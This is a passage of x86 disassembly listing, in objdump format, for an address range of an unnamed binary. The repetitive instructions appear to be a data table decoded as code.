  43a712:	inc    DWORD PTR [eax]
  43a714:	add    BYTE PTR [edi],ch
  43a716:	inc    DWORD PTR [eax]
  43a718:	add    BYTE PTR [eax],ch
  43a71a:	inc    DWORD PTR [eax]
  43a71c:	add    BYTE PTR [ebx],ah
  43a71e:	inc    DWORD PTR [eax]
  43a720:	add    BYTE PTR [edi],ch
  43a722:	inc    DWORD PTR [eax]
  43a724:	add    BYTE PTR [edi],dh
  43a726:	inc    DWORD PTR [eax]
  43a728:	add    BYTE PTR [edx],dh
  43a72a:	inc    DWORD PTR [eax]
  43a72c:	add    BYTE PTR [esi],ch
  43a72e:	inc    DWORD PTR [eax]
  43a730:	add    BYTE PTR ds:0x2b0000ff,ah
  43a736:	inc    DWORD PTR [eax]
  43a738:	add    BYTE PTR [eax],ah
  43a73a:	inc    DWORD PTR [eax]
  43a73c:	add    BYTE PTR ds:0x250000ff,ah
  43a742:	inc    DWORD PTR [eax]
  43a744:	add    BYTE PTR [ebx],bl
  43a746:	inc    DWORD PTR [eax]
  43a748:	add    BYTE PTR [eax],ah
  43a74a:	inc    DWORD PTR [eax]
  43a74c:	add    BYTE PTR ds:0x1f0000ff,bl
  43a752:	inc    DWORD PTR [eax]
  43a754:	add    BYTE PTR [esi],bl
  43a756:	inc    DWORD PTR [eax]
  43a758:	add    BYTE PTR [ebx],ah
  43a75a:	inc    DWORD PTR [eax]
  43a75c:	add    BYTE PTR [ecx],ah
  43a75e:	inc    DWORD PTR [eax]
  43a760:	add    BYTE PTR [eax],ch
  43a762:	inc    DWORD PTR [eax]
  43a764:	add    BYTE PTR [esi],dh
  43a766:	inc    DWORD PTR [eax]
  43a768:	add    BYTE PTR ds:0x2d0000ff,ch
  43a76e:	inc    DWORD PTR [eax]
  43a770:	add    BYTE PTR [ecx],ch
  43a772:	inc    DWORD PTR [eax]
  43a774:	add    BYTE PTR ds:0x2c0000ff,ch
  43a77a:	inc    DWORD PTR [eax]
  43a77c:	add    BYTE PTR [edi],ah
  43a77e:	inc    DWORD PTR [eax]
  43a780:	add    BYTE PTR [edi+edi*8],dh
  43a783:	add    BYTE PTR [eax],al
  43a785:	inc    DWORD PTR cs:[eax]
  43a788:	add    BYTE PTR ds:0x3e0000ff,dh
  43a78e:	inc    DWORD PTR [eax]
  43a790:	add    BYTE PTR [edi+edi*8],ah
  43a793:	add    BYTE PTR [eax],al
  43a795:	inc    DWORD PTR cs:[eax]
  43a798:	add    BYTE PTR [ecx],bh
  43a79a:	inc    DWORD PTR [eax]
  43a79c:	add    BYTE PTR [eax],bh
  43a79e:	inc    DWORD PTR [eax]
  43a7a0:	add    BYTE PTR [ebx],dh
  43a7a2:	inc    DWORD PTR [eax]
  43a7a4:	add    BYTE PTR [edi+edi*8],ah
  43a7a7:	add    BYTE PTR [eax],al
  43a7a9:	sub    al,0xff
  43a7ab:	add    BYTE PTR [eax],al
  43a7ad:	cmp    bh,bh
  43a7af:	add    BYTE PTR [eax],al
  43a7b1:	cmp    bh,bh
  43a7b3:	add    BYTE PTR [eax],al
  43a7b5:	xor    al,0xff
  43a7b7:	add    BYTE PTR [eax],al
  43a7b9:	xor    edi,edi
  43a7bb:	add    BYTE PTR [eax],al
  43a7bd:	cmp    edi,edi
  43a7bf:	add    BYTE PTR [eax],al
  43a7c1:	xor    edi,edi
  43a7c3:	add    BYTE PTR [eax],al
  43a7c5:	aaa    
  43a7c6:	inc    DWORD PTR [eax]
  43a7c8:	add    BYTE PTR [edi+edi*8],ah
  43a7cb:	add    BYTE PTR [eax],al
  43a7cd:	daa    
  43a7ce:	inc    DWORD PTR [eax]
  43a7d0:	add    BYTE PTR [ebx],ch
  43a7d2:	inc    DWORD PTR [eax]
  43a7d4:	add    BYTE PTR [edi+edi*8],ch
  43a7d7:	add    BYTE PTR [eax],al
  43a7d9:	xor    bh,bh
  43a7db:	add    BYTE PTR [eax],al
  43a7dd:	sbb    al,0xff
  43a7df:	add    BYTE PTR [eax],al
  43a7e1:	xor    bh,bh
  43a7e3:	add    BYTE PTR [eax],al
  43a7e5:	dec    edx
  43a7e6:	inc    DWORD PTR [eax]
  43a7e8:	add    BYTE PTR [ebp-0x1],al
  43a7eb:	add    BYTE PTR [eax],al
  43a7ed:	xor    eax,0x380000ff
  43a7f2:	inc    DWORD PTR [eax]
  43a7f4:	add    BYTE PTR ds:0x320000ff,bh
  43a7fa:	inc    DWORD PTR [eax]
  43a7fc:	add    BYTE PTR [edi-0x1],al
  43a7ff:	add    BYTE PTR [eax],al
  43a801:	inc    ebp
  43a802:	inc    DWORD PTR [eax]
  43a804:	add    BYTE PTR [esi],dh
  43a806:	inc    DWORD PTR [eax]
  43a808:	add    BYTE PTR ds:0x290000ff,ch
  43a80e:	inc    DWORD PTR [eax]
  43a810:	add    BYTE PTR [ebp-0x1],cl
  43a813:	add    BYTE PTR [eax],al
  43a815:	inc    edi
  43a816:	inc    DWORD PTR [eax]
  43a818:	add    BYTE PTR [edi+edi*8+0x0],al
  43a81c:	add    BYTE PTR [eax],bh
  43a81e:	inc    DWORD PTR [eax]
  43a820:	add    BYTE PTR [ecx-0x1],al
  43a823:	add    BYTE PTR [eax],al
  43a825:	dec    ebx
  43a826:	inc    DWORD PTR [eax]
  43a828:	add    BYTE PTR [edx-0x1],cl
  43a82b:	add    BYTE PTR [eax],al
  43a82d:	aas    
  43a82e:	inc    DWORD PTR [eax]
  43a830:	add    BYTE PTR [eax-0x1],cl
  43a833:	add    BYTE PTR [eax],al
  43a835:	pop    edx
  43a836:	inc    DWORD PTR [eax]
  43a838:	add    BYTE PTR [edi],dh
  43a83a:	inc    DWORD PTR [eax]
  43a83c:	add    BYTE PTR [ebp-0x1],al
  43a83f:	add    BYTE PTR [eax],al
  43a841:	dec    esi
  43a842:	inc    DWORD PTR [eax]
  43a844:	add    BYTE PTR [ecx-0x1],dl
  43a847:	add    BYTE PTR [eax],al
  43a849:	xor    bh,bh
  43a84b:	add    BYTE PTR [eax],al
  43a84d:	sub    al,0xff
  43a84f:	add    BYTE PTR [eax],al
  43a851:	push   eax
  43a852:	inc    DWORD PTR [eax]
  43a854:	add    BYTE PTR [edx-0x1],cl
  43a857:	add    BYTE PTR [eax],al
  43a859:	cmp    bh,bh
  43a85b:	add    BYTE PTR [eax],al
  43a85d:	dec    ecx
  43a85e:	inc    DWORD PTR [eax]
  43a860:	add    BYTE PTR [ebx],bh
  43a862:	inc    DWORD PTR [eax]
  43a864:	add    BYTE PTR [edi+edi*8],bh
  43a867:	add    BYTE PTR [eax],al
  43a869:	pop    ecx
  43a86a:	inc    DWORD PTR [eax]
  43a86c:	add    BYTE PTR [eax-0x1],ah
  43a86f:	add    BYTE PTR [eax],al
  43a871:	push   ebx
  43a872:	inc    DWORD PTR [eax]
  43a874:	add    BYTE PTR [edx-0x1],al
  43a877:	add    BYTE PTR [eax],al
  43a879:	push   edx
  43a87a:	inc    DWORD PTR [eax]
  43a87c:	add    BYTE PTR [ecx-0x1],al
  43a87f:	add    BYTE PTR [eax],al
  43a881:	inc    eax
  43a882:	inc    DWORD PTR [eax]
  43a884:	add    BYTE PTR [esi-0x1],bl
  43a887:	add    BYTE PTR [eax],al
  43a889:	push   esi
  43a88a:	inc    DWORD PTR [eax]
  43a88c:	add    BYTE PTR ds:0x3c0000ff,dh
  43a892:	inc    DWORD PTR [eax]
  43a894:	add    BYTE PTR [esi-0x1],dl
  43a897:	add    BYTE PTR [eax],al
  43a899:	inc    edi
  43a89a:	inc    DWORD PTR [eax]
  43a89c:	add    BYTE PTR ds:0x320000ff,dh
  43a8a2:	inc    DWORD PTR [eax]
  43a8a4:	add    BYTE PTR [edi],dh
  43a8a6:	inc    DWORD PTR [eax]
  43a8a8:	add    BYTE PTR [eax-0x1],dl
  43a8ab:	add    BYTE PTR [eax],al
  43a8ad:	push   eax
  43a8ae:	inc    DWORD PTR [eax]
  43a8b0:	add    BYTE PTR [ecx-0x1],al
  43a8b3:	add    BYTE PTR [eax],al
  43a8b5:	dec    eax
  43a8b6:	inc    DWORD PTR [eax]
  43a8b8:	add    BYTE PTR [eax-0x1],cl
  43a8bb:	add    BYTE PTR [eax],al
  43a8bd:	aas    
  43a8be:	inc    DWORD PTR [eax]
  43a8c0:	add    BYTE PTR [edx],bh
  43a8c2:	inc    DWORD PTR [eax]
  43a8c4:	add    BYTE PTR ds:0x400000ff,dh
  43a8ca:	inc    DWORD PTR [eax]
  43a8cc:	add    BYTE PTR [ebx-0x1],al
  43a8cf:	add    BYTE PTR [eax],al
  43a8d1:	xor    eax,0x330000ff
  43a8d6:	inc    DWORD PTR [eax]
  43a8d8:	add    BYTE PTR [edi+edi*8],bh
  43a8db:	add    BYTE PTR [eax],al
  43a8dd:	inc    DWORD PTR ss:[eax]
  43a8e0:	add    BYTE PTR [edx],dh
  43a8e2:	inc    DWORD PTR [eax]
  43a8e4:	add    BYTE PTR [ebx-0x1],al
  43a8e7:	add    BYTE PTR [eax],al
  43a8e9:	inc    ecx
  43a8ea:	inc    DWORD PTR [eax]
  43a8ec:	add    BYTE PTR [edi+edi*8+0x0],al
  43a8f0:	add    BYTE PTR [eax],ch
  43a8f2:	inc    DWORD PTR [eax]
  43a8f4:	add    BYTE PTR [esi],dh
  43a8f6:	inc    DWORD PTR [eax]
  43a8f8:	add    BYTE PTR [eax],bh
  43a8fa:	inc    DWORD PTR [eax]
  43a8fc:	add    BYTE PTR [ecx],bh
  43a8fe:	inc    DWORD PTR [eax]
  43a900:	add    BYTE PTR [edi],bh
  43a902:	inc    DWORD PTR [eax]
  43a904:	add    BYTE PTR [edi+edi*8],ch
  43a907:	add    BYTE PTR [eax],al
  43a909:	xor    bh,bh
  43a90b:	add    BYTE PTR [eax],al
  43a90d:	cmp    bh,bh
  43a90f:	add    BYTE PTR [eax],al
  43a911:	cmp    edi,edi
  43a913:	add    BYTE PTR [eax],al
  43a915:	xor    al,0xff
  43a917:	add    BYTE PTR [eax],al
  43a919:	cmp    edi,edi
  43a91b:	add    BYTE PTR [eax],al
  43a91d:	sub    al,0xff
  43a91f:	add    BYTE PTR [eax],al
  43a921:	sub    edi,edi
  43a923:	add    BYTE PTR [eax],al
  43a925:	xor    edi,edi
  43a927:	add    BYTE PTR [eax],al
  43a929:	and    edi,edi
  43a92b:	add    BYTE PTR [eax],al
  43a92d:	daa    
  43a92e:	inc    DWORD PTR [eax]
  43a930:	add    BYTE PTR [edi],ah
  43a932:	inc    DWORD PTR [eax]
  43a934:	add    BYTE PTR [edx],dh
  43a936:	inc    DWORD PTR [eax]
  43a938:	add    BYTE PTR [ecx],dh
  43a93a:	inc    DWORD PTR [eax]
  43a93c:	add    BYTE PTR [ecx],ch
  43a93e:	inc    DWORD PTR [eax]
  43a940:	add    BYTE PTR [edi],ch
  43a942:	inc    DWORD PTR [eax]
  43a944:	add    BYTE PTR ds:0x230000ff,bl
  43a94a:	inc    DWORD PTR [eax]
  43a94c:	add    BYTE PTR [edi],bl
  43a94e:	inc    DWORD PTR [eax]
  43a950:	add    BYTE PTR [edi],bl
  43a952:	inc    DWORD PTR [eax]
  43a954:	add    BYTE PTR [esi],ah
  43a956:	inc    DWORD PTR [eax]
  43a958:	add    BYTE PTR [ebx],ah
  43a95a:	inc    DWORD PTR [eax]
  43a95c:	add    BYTE PTR [esi],bl
  43a95e:	inc    DWORD PTR [eax]
  43a960:	add    BYTE PTR [esi],ah
  43a962:	inc    DWORD PTR [eax]
  43a964:	add    BYTE PTR [edi+edi*8],ch
  43a967:	add    BYTE PTR [eax],al
  43a969:	and    edi,edi
  43a96b:	add    BYTE PTR [eax],al
  43a96d:	and    edi,edi
  43a96f:	add    BYTE PTR [eax],al
  43a971:	sbb    al,0xff
  43a973:	add    BYTE PTR [eax],al
  43a975:	sub    bh,bh
  43a977:	add    BYTE PTR [eax],al
  43a979:	inc    DWORD PTR ss:[eax]
  43a97c:	add    BYTE PTR [edi],ch
  43a97e:	inc    DWORD PTR [eax]
  43a980:	add    BYTE PTR [esi],dh
  43a982:	inc    DWORD PTR [eax]
  43a984:	add    BYTE PTR ds:0x410000ff,bh
  43a98a:	inc    DWORD PTR [eax]
  43a98c:	add    BYTE PTR [edx],bh
  43a98e:	inc    DWORD PTR [eax]
  43a990:	add    BYTE PTR [edx],bh
  43a992:	inc    DWORD PTR [eax]
  43a994:	add    BYTE PTR [edi+edi*8],dh
  43a997:	add    BYTE PTR [eax],al
  43a999:	xor    edi,edi
  43a99b:	add    BYTE PTR [eax],al
  43a99d:	sbb    bh,bh
  43a99f:	add    BYTE PTR [eax],al
  43a9a1:	sub    bh,bh
  43a9a3:	add    BYTE PTR [eax],al
  43a9a5:	inc    DWORD PTR cs:[eax]
  43a9a8:	add    BYTE PTR [edi],bl
  43a9aa:	inc    DWORD PTR [eax]
  43a9ac:	add    BYTE PTR ds:0x480000ff,dh
  43a9b2:	inc    DWORD PTR [eax]
  43a9b4:	add    BYTE PTR [edx-0x1],al
  43a9b7:	add    BYTE PTR [eax],al
  43a9b9:	cmp    eax,0x310000ff
  43a9be:	inc    DWORD PTR [eax]
  43a9c0:	add    BYTE PTR [ecx],dh
  43a9c2:	inc    DWORD PTR [eax]
  43a9c4:	add    BYTE PTR [edi+edi*8],ah
  43a9c7:	add    BYTE PTR [eax],al
  43a9c9:	sub    al,0xff
  43a9cb:	add    BYTE PTR [eax],al
  43a9cd:	inc    DWORD PTR ss:[eax]
  43a9d0:	add    BYTE PTR [esi],ah
  43a9d2:	inc    DWORD PTR [eax]
  43a9d4:	add    BYTE PTR [edi],dh
  43a9d6:	inc    DWORD PTR [eax]
  43a9d8:	add    BYTE PTR [edx],ch
  43a9da:	inc    DWORD PTR [eax]
  43a9dc:	add    BYTE PTR [ecx],ah
  43a9de:	inc    DWORD PTR [eax]
  43a9e0:	add    BYTE PTR [edi],ch
  43a9e2:	inc    DWORD PTR [eax]
  43a9e4:	add    BYTE PTR [edi+edi*8],ch
  43a9e7:	add    BYTE PTR [eax],al
  43a9e9:	cmp    al,0xff
  43a9eb:	add    BYTE PTR [eax],al
  43a9ed:	cmp    eax,0x3e0000ff
  43a9f2:	inc    DWORD PTR [eax]
  43a9f4:	add    BYTE PTR [ecx-0x1],cl
  43a9f7:	add    BYTE PTR [eax],al
  43a9f9:	cmp    edi,edi
  43a9fb:	add    BYTE PTR [eax],al
  43a9fd:	inc    edx
  43a9fe:	inc    DWORD PTR [eax]
  43aa00:	add    BYTE PTR ds:0x260000ff,dh
  43aa06:	inc    DWORD PTR [eax]
  43aa08:	add    BYTE PTR [eax-0x1],cl
  43aa0b:	add    BYTE PTR [eax],al
  43aa0d:	inc    DWORD PTR ds:[eax]
  43aa10:	add    BYTE PTR [ecx-0x1],al
  43aa13:	add    BYTE PTR [eax],al
  43aa15:	inc    esi
  43aa16:	inc    DWORD PTR [eax]
  43aa18:	add    BYTE PTR [edx-0x1],dl
  43aa1b:	add    BYTE PTR [eax],al
  43aa1d:	xor    al,0xff
  43aa1f:	add    BYTE PTR [eax],al
  43aa21:	dec    eax
  43aa22:	inc    DWORD PTR [eax]
  43aa24:	add    BYTE PTR [eax-0x1],al
  43aa27:	add    BYTE PTR [eax],al
  43aa29:	cmp    bh,bh
  43aa2b:	add    BYTE PTR [eax],al
  43aa2d:	inc    ebx
  43aa2e:	inc    DWORD PTR [eax]
  43aa30:	add    BYTE PTR [ecx-0x1],al
  43aa33:	add    BYTE PTR [eax],al
  43aa35:	inc    ebx
  43aa36:	inc    DWORD PTR [eax]
  43aa38:	add    BYTE PTR [edi+edi*8],bh
  43aa3b:	add    BYTE PTR [eax],al
  43aa3d:	sub    al,0xff
  43aa3f:	add    BYTE PTR [eax],al
  43aa41:	cmp    al,0xff
  43aa43:	add    BYTE PTR [eax],al
  43aa45:	inc    esp
  43aa46:	inc    DWORD PTR [eax]
  43aa48:	add    BYTE PTR [ebx],dh
  43aa4a:	inc    DWORD PTR [eax]
  43aa4c:	add    BYTE PTR [ecx],bh
  43aa4e:	inc    DWORD PTR [eax]
  43aa50:	add    BYTE PTR [edi],bh
  43aa52:	inc    DWORD PTR [eax]
  43aa54:	add    BYTE PTR [ebx-0x1],al
  43aa57:	add    BYTE PTR [eax],al
  43aa59:	inc    eax
  43aa5a:	inc    DWORD PTR [eax]
  43aa5c:	add    BYTE PTR [ecx-0x1],al
  43aa5f:	add    BYTE PTR [eax],al
  43aa61:	sub    eax,0x410000ff
  43aa66:	inc    DWORD PTR [eax]
  43aa68:	add    BYTE PTR [ebp-0x1],dl
  43aa6b:	add    BYTE PTR [eax],al
  43aa6d:	push   esi
  43aa6e:	inc    DWORD PTR [eax]
  43aa70:	add    BYTE PTR [edi-0x1],bl
  43aa73:	add    BYTE PTR [eax],al
  43aa75:	push   edx
  43aa76:	inc    DWORD PTR [eax]
  43aa78:	add    BYTE PTR [ebx],bh
  43aa7a:	inc    DWORD PTR [eax]
  43aa7c:	add    BYTE PTR [edi],bh
  43aa7e:	inc    DWORD PTR [eax]
  43aa80:	add    BYTE PTR [eax],ch
  43aa82:	inc    DWORD PTR [eax]
  43aa84:	add    BYTE PTR [edi-0x1],al
  43aa87:	add    BYTE PTR [eax],al
  43aa89:	push   ebx
  43aa8a:	inc    DWORD PTR [eax]
  43aa8c:	add    BYTE PTR [eax],dh
  43aa8e:	inc    DWORD PTR [eax]
  43aa90:	add    BYTE PTR [esi],bh
  43aa92:	inc    DWORD PTR [eax]
  43aa94:	add    BYTE PTR ds:0x590000ff,bh
  43aa9a:	inc    DWORD PTR [eax]
  43aa9c:	add    BYTE PTR ds:0x370000ff,bh
  43aaa2:	inc    DWORD PTR [eax]
  43aaa4:	add    BYTE PTR [ecx-0x1],al
  43aaa7:	add    BYTE PTR [eax],al
  43aaa9:	push   edx
  43aaaa:	inc    DWORD PTR [eax]
  43aaac:	add    BYTE PTR [edi+edi*8+0x0],cl
  43aab0:	add    BYTE PTR [edx],ch
  43aab2:	inc    DWORD PTR [eax]
  43aab4:	add    BYTE PTR [edi],dh
  43aab6:	inc    DWORD PTR [eax]
  43aab8:	add    BYTE PTR [ecx-0x1],al
  43aabb:	add    BYTE PTR [eax],al
  43aabd:	inc    eax
  43aabe:	inc    DWORD PTR [eax]
  43aac0:	add    BYTE PTR [edx-0x1],al
  43aac3:	add    BYTE PTR [eax],al
  43aac5:	dec    ecx
  43aac6:	inc    DWORD PTR [eax]
  43aac8:	add    BYTE PTR [edi+edi*8],bh
  43aacb:	add    BYTE PTR [eax],al
  43aacd:	inc    ebx
  43aace:	inc    DWORD PTR [eax]
  43aad0:	add    BYTE PTR [esi],bh
  43aad2:	inc    DWORD PTR [eax]
  43aad4:	add    BYTE PTR [ecx],dh
  43aad6:	inc    DWORD PTR [eax]
  43aad8:	add    BYTE PTR [ecx-0x1],al
  43aadb:	add    BYTE PTR [eax],al
  43aadd:	xor    bh,bh
  43aadf:	add    BYTE PTR [eax],al
  43aae1:	xor    al,0xff
  43aae3:	add    BYTE PTR [eax],al
  43aae5:	inc    DWORD PTR es:[eax]
  43aae8:	add    BYTE PTR [esi],ch
  43aaea:	inc    DWORD PTR [eax]
  43aaec:	add    BYTE PTR [ecx],bh
  43aaee:	inc    DWORD PTR [eax]
  43aaf0:	add    BYTE PTR [edi+edi*8],dh
  43aaf3:	add    BYTE PTR [eax],al
  43aaf5:	xor    bh,bh
  43aaf7:	add    BYTE PTR [eax],al
  43aaf9:	cmp    bh,bh
  43aafb:	add    BYTE PTR [eax],al
  43aafd:	xor    edi,edi
  43aaff:	add    BYTE PTR [eax],al
  43ab01:	inc    DWORD PTR ss:[eax]
  43ab04:	add    BYTE PTR [esi],dh
  43ab06:	inc    DWORD PTR [eax]
  43ab08:	add    BYTE PTR [esi],dh
  43ab0a:	inc    DWORD PTR [eax]
  43ab0c:	add    BYTE PTR [esi],bh
  43ab0e:	inc    DWORD PTR [eax]
  43ab10:	add    BYTE PTR [eax],dh
  43ab12:	inc    DWORD PTR [eax]
  43ab14:	add    BYTE PTR [edx],ch
  43ab16:	inc    DWORD PTR [eax]
  43ab18:	add    BYTE PTR [ebx],bh
  43ab1a:	inc    DWORD PTR [eax]
  43ab1c:	add    BYTE PTR [ecx],ch
  43ab1e:	inc    DWORD PTR [eax]
  43ab20:	add    BYTE PTR [edi+edi*8],ch
  43ab23:	add    BYTE PTR [eax],al
  43ab25:	inc    DWORD PTR es:[eax]
  43ab28:	add    BYTE PTR ds:0x230000ff,ah
  43ab2e:	inc    DWORD PTR [eax]
  43ab30:	add    BYTE PTR [edx],dh
  43ab32:	inc    DWORD PTR [eax]
  43ab34:	add    BYTE PTR [esi],dh
  43ab36:	inc    DWORD PTR [eax]
  43ab38:	add    BYTE PTR [eax],dh
  43ab3a:	inc    DWORD PTR [eax]
  43ab3c:	add    BYTE PTR [eax],dh
  43ab3e:	inc    DWORD PTR [eax]
  43ab40:	add    BYTE PTR [esi],ch
  43ab42:	inc    DWORD PTR [eax]
  43ab44:	add    BYTE PTR [ebx],bl
  43ab46:	inc    DWORD PTR [eax]
  43ab48:	add    BYTE PTR [edi],ah
  43ab4a:	inc    DWORD PTR [eax]
  43ab4c:	add    BYTE PTR [edi+edi*8],bl
  43ab4f:	add    BYTE PTR [eax],al
  43ab51:	and    al,0xff
  43ab53:	add    BYTE PTR [eax],al
  43ab55:	sbb    edi,edi
  43ab57:	add    BYTE PTR [eax],al
  43ab59:	inc    DWORD PTR cs:[eax]
  43ab5c:	add    BYTE PTR ds:0x1b0000ff,dh
  43ab62:	inc    DWORD PTR [eax]
  43ab64:	add    BYTE PTR [edx],dh
  43ab66:	inc    DWORD PTR [eax]
  43ab68:	add    BYTE PTR [edx],ah
  43ab6a:	inc    DWORD PTR [eax]
  43ab6c:	add    BYTE PTR [ecx],dh
  43ab6e:	inc    DWORD PTR [eax]
  43ab70:	add    BYTE PTR [edi+edi*8],bl
  43ab73:	add    BYTE PTR [eax],al
  43ab75:	and    eax,0x200000ff
  43ab7a:	inc    DWORD PTR [eax]
  43ab7c:	add    BYTE PTR [edx],bl
  43ab7e:	inc    DWORD PTR [eax]
  43ab80:	add    BYTE PTR [esi],ah
  43ab82:	inc    DWORD PTR [eax]
  43ab84:	add    BYTE PTR [esi],ah
  43ab86:	inc    DWORD PTR [eax]
  43ab88:	add    BYTE PTR [esi],ch
  43ab8a:	inc    DWORD PTR [eax]
  43ab8c:	add    BYTE PTR ds:0x450000ff,ch
  43ab92:	inc    DWORD PTR [eax]
  43ab94:	add    BYTE PTR [ecx-0x1],cl
  43ab97:	add    BYTE PTR [eax],al
  43ab99:	inc    ecx
  43ab9a:	inc    DWORD PTR [eax]
  43ab9c:	add    BYTE PTR [ebx],dh
  43ab9e:	inc    DWORD PTR [eax]
  43aba0:	add    BYTE PTR [edx],dh
  43aba2:	inc    DWORD PTR [eax]
  43aba4:	add    BYTE PTR [ebx],ch
  43aba6:	inc    DWORD PTR [eax]
  43aba8:	add    BYTE PTR [ecx],ch
  43abaa:	inc    DWORD PTR [eax]
  43abac:	add    BYTE PTR [edx],ch
  43abae:	inc    DWORD PTR [eax]
  43abb0:	add    BYTE PTR [edx],dl
  43abb2:	inc    DWORD PTR [eax]
  43abb4:	add    BYTE PTR [ecx],dh
  43abb6:	inc    DWORD PTR [eax]
  43abb8:	add    BYTE PTR [edx-0x1],al
  43abbb:	add    BYTE PTR [eax],al
  43abbd:	xor    al,0xff
  43abbf:	add    BYTE PTR [eax],al
  43abc1:	dec    ecx
  43abc2:	inc    DWORD PTR [eax]
  43abc4:	add    BYTE PTR [esi-0x1],al
  43abc7:	add    BYTE PTR [eax],al
  43abc9:	sub    al,0xff
  43abcb:	add    BYTE PTR [eax],al
  43abcd:	aas    
  43abce:	inc    DWORD PTR [eax]
  43abd0:	add    BYTE PTR ds:0x320000ff,ah
  43abd6:	inc    DWORD PTR [eax]
  43abd8:	add    BYTE PTR [edi+edi*8],dh
  43abdb:	add    BYTE PTR [eax],al
  43abdd:	das    
  43abde:	inc    DWORD PTR [eax]
  43abe0:	add    BYTE PTR [ecx],bh
  43abe2:	inc    DWORD PTR [eax]
  43abe4:	add    BYTE PTR [eax],bh
  43abe6:	inc    DWORD PTR [eax]
  43abe8:	add    BYTE PTR ds:0x300000ff,ch
  43abee:	inc    DWORD PTR [eax]
  43abf0:	add    BYTE PTR [edi-0x1],cl
  43abf3:	add    BYTE PTR [eax],al
  43abf5:	cmp    bh,bh
  43abf7:	add    BYTE PTR [eax],al
  43abf9:	xor    eax,0x370000ff
  43abfe:	inc    DWORD PTR [eax]
  43ac00:	add    BYTE PTR [ebx],dh
  43ac02:	inc    DWORD PTR [eax]
  43ac04:	add    BYTE PTR ds:0x330000ff,bh
  43ac0a:	inc    DWORD PTR [eax]
  43ac0c:	add    BYTE PTR [esi],dh
  43ac0e:	inc    DWORD PTR [eax]
  43ac10:	add    BYTE PTR [edi-0x1],dl
  43ac13:	add    BYTE PTR [eax],al
  43ac15:	dec    ebp
  43ac16:	inc    DWORD PTR [eax]
  43ac18:	add    BYTE PTR [ecx-0x1],cl
  43ac1b:	add    BYTE PTR [eax],al
  43ac1d:	sub    al,0xff
  43ac1f:	add    BYTE PTR [eax],al
  43ac21:	dec    ebx
  43ac22:	inc    DWORD PTR [eax]
  43ac24:	add    BYTE PTR [eax-0x1],dl
  43ac27:	add    BYTE PTR [eax],al
  43ac29:	push   eax
  43ac2a:	inc    DWORD PTR [eax]
  43ac2c:	add    BYTE PTR [edi-0x1],al
  43ac2f:	add    BYTE PTR [eax],al
  43ac31:	inc    ebp
  43ac32:	inc    DWORD PTR [eax]
  43ac34:	add    BYTE PTR [eax-0x1],al
  43ac37:	add    BYTE PTR [eax],al
  43ac39:	dec    ecx
  43ac3a:	inc    DWORD PTR [eax]
  43ac3c:	add    BYTE PTR [edi+edi*8],bh
  43ac3f:	add    BYTE PTR [eax],al
  43ac41:	xor    eax,0x3e0000ff
  43ac46:	inc    DWORD PTR [eax]
  43ac48:	add    BYTE PTR [edx-0x1],al
  43ac4b:	add    BYTE PTR [eax],al
  43ac4d:	cmp    bh,bh
  43ac4f:	add    BYTE PTR [eax],al
  43ac51:	dec    esp
  43ac52:	inc    DWORD PTR [eax]
  43ac54:	add    BYTE PTR [eax-0x1],dl
  43ac57:	add    BYTE PTR [eax],al
  43ac59:	inc    DWORD PTR cs:[eax]
  43ac5c:	add    BYTE PTR [edx],bh
  43ac5e:	inc    DWORD PTR [eax]
  43ac60:	add    BYTE PTR [ebx],dh
  43ac62:	inc    DWORD PTR [eax]
  43ac64:	add    BYTE PTR [esi-0x1],al
  43ac67:	add    BYTE PTR [eax],al
  43ac69:	dec    ebp
  43ac6a:	inc    DWORD PTR [eax]
  43ac6c:	add    BYTE PTR [ebx-0x1],al
  43ac6f:	add    BYTE PTR [eax],al
  43ac71:	pop    ecx
  43ac72:	inc    DWORD PTR [eax]
  43ac74:	add    BYTE PTR [eax-0x1],cl
  43ac77:	add    BYTE PTR [eax],al
  43ac79:	pop    edx
  43ac7a:	inc    DWORD PTR [eax]
  43ac7c:	add    BYTE PTR [esi-0x1],dl
  43ac7f:	add    BYTE PTR [eax],al
  43ac81:	xor    al,0xff
  43ac83:	add    BYTE PTR [eax],al
  43ac85:	inc    ebp
  43ac86:	inc    DWORD PTR [eax]
  43ac88:	add    BYTE PTR [ebx-0x1],al
  43ac8b:	add    BYTE PTR [eax],al
  43ac8d:	inc    DWORD PTR cs:[eax]
  43ac90:	add    BYTE PTR [edi-0x1],al
  43ac93:	add    BYTE PTR [eax],al
  43ac95:	dec    esi
  43ac96:	inc    DWORD PTR [eax]
  43ac98:	add    BYTE PTR [ecx-0x1],cl
  43ac9b:	add    BYTE PTR [eax],al
  43ac9d:	sub    bh,bh
  43ac9f:	add    BYTE PTR [eax],al
  43aca1:	xor    eax,0x3f0000ff
  43aca6:	inc    DWORD PTR [eax]
  43aca8:	add    BYTE PTR [esi-0x1],al
  43acab:	add    BYTE PTR [eax],al
  43acad:	dec    ebx
  43acae:	inc    DWORD PTR [eax]
  43acb0:	add    BYTE PTR [esi],dh
  43acb2:	inc    DWORD PTR [eax]
  43acb4:	add    BYTE PTR [edi+edi*8],ch
  43acb7:	add    BYTE PTR [eax],al
  43acb9:	cmp    bh,bh
  43acbb:	add    BYTE PTR [eax],al
  43acbd:	cmp    bh,bh
  43acbf:	add    BYTE PTR [eax],al
  43acc1:	aas    
  43acc2:	inc    DWORD PTR [eax]
  43acc4:	add    BYTE PTR [esi],bh
  43acc6:	inc    DWORD PTR [eax]
  43acc8:	add    BYTE PTR [eax],bh
  43acca:	inc    DWORD PTR [eax]
  43accc:	add    BYTE PTR [ebx],bh
  43acce:	inc    DWORD PTR [eax]
  43acd0:	add    BYTE PTR [edi],dh
  43acd2:	inc    DWORD PTR [eax]
  43acd4:	add    BYTE PTR [edx-0x1],al
  43acd7:	add    BYTE PTR [eax],al
  43acd9:	xor    al,0xff
  43acdb:	add    BYTE PTR [eax],al
  43acdd:	cmp    edi,edi
  43acdf:	add    BYTE PTR [eax],al
  43ace1:	xor    eax,0x430000ff
  43ace6:	inc    DWORD PTR [eax]
  43ace8:	add    BYTE PTR [ebx],bh
  43acea:	inc    DWORD PTR [eax]
  43acec:	add    BYTE PTR [ecx-0x1],al
  43acef:	add    BYTE PTR [eax],al
  43acf1:	inc    edx
  43acf2:	inc    DWORD PTR [eax]
  43acf4:	add    BYTE PTR [ebx],dh
  43acf6:	inc    DWORD PTR [eax]
  43acf8:	add    BYTE PTR [edi+edi*8],dh
  43acfb:	add    BYTE PTR [eax],al
  43acfd:	sub    al,0xff
  43acff:	add    BYTE PTR [eax],al
  43ad01:	and    edi,edi
  43ad03:	add    BYTE PTR [eax],al
  43ad05:	aaa    
  43ad06:	inc    DWORD PTR [eax]
